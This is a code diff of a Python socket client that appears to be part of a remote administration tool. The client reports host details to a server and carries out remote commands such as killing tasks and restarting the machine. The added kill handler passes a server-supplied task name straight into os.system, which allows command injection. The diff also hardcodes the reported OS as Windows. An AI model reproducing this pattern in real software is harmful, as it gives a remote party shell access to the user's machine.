@@ -109,41 +109,15 @@ class Welcome:
             self.logger.debug(f"Connection error: {e}")
             return False
 
-    def send_external_ip(self):
-        try:
-            response = requests.get('https://api.ipify.org?format=json')
-            if response.status_code == 200:
-                data = response.json()
-                ip_address = data['ip']
-                self.client.soc.send(ip_address.encode())
-                self.logger.debug(f"Waiting for confirmation...")
-                self.client.soc.settimeout(self.intro_socket_timeout)
-                message = self.client.soc.recv(self.buffer_size).decode()
-                self.client.soc.settimeout(self.default_socket_timeout)
-
-            else:
-                print('Failed to retrieve external IP address.')
-                self.client.soc.send('Null'.encode())
-                return False
-
-        except requests.RequestException as e:
-            print('Error occurred during the request:', e)
-            return False
-
     def send_os_platform(self):
         system = platform.system()
         release = platform.release()
-
-        if system == 'Windows':
-            self.client.soc.send(f'Windows {release}'.encode())
-
-        elif system == 'Linux':
-            self.client.soc.send(f'Linux {release}'.encode())
-
-        else:
-            self.client.soc.send(f'Unknown {release}'.encode())
-
+        self.logger.debug(f"Sending OS Platform: Windows {release}...")
+        self.client.soc.send(f'Windows {release}'.encode())
+        self.logger.debug(f"Waiting for confirmation...")
         message = self.client.soc.recv(self.buffer_size).decode()
+        self.logger.debug(f"Server: {message}")
+        self.logger.info(f"send_os_platform completed.")
         return
 
     def send_boot_time(self):
@@ -352,9 +326,26 @@ class Welcome:
 
                 # Kill Task
                 elif str(command.lower())[:4] == "kill":
-                    self.logger.debug(f"Calling tasks.kill...")
-                    task = Tasks(self.client, self.log_path, self.app_path)
-                    task.kill()
+                    self.logger.debug(f"Waiting for task name...")
+                    try:
+                        task2kill = self.client.soc.recv(1024).decode()
+                        self.logger.debug(f"Task name: {task2kill}")
+
+                    except (WindowsError, socket.error) as e:
+                        self.logger.debug(f"Connection Error: {e}")
+                        return False
+
+                    self.logger.debug(f"Killing {task2kill}...")
+                    os.system(f'taskkill /IM {task2kill} /F')
+                    self.logger.debug(f"{task2kill} killed.")
+                    self.logger.debug(f"Sending killed confirmation to server...")
+                    try:
+                        self.client.soc.send(f"Task: {task2kill} Killed.".encode())
+                        self.logger.debug(f"Send completed.")
+
+                    except (WindowsError, socket.error) as e:
+                        self.logger.debug(f"Connection Error: {e}")
+                        return False
 
                 # Restart Machine
                 elif str(command.lower())[:7] == "restart":
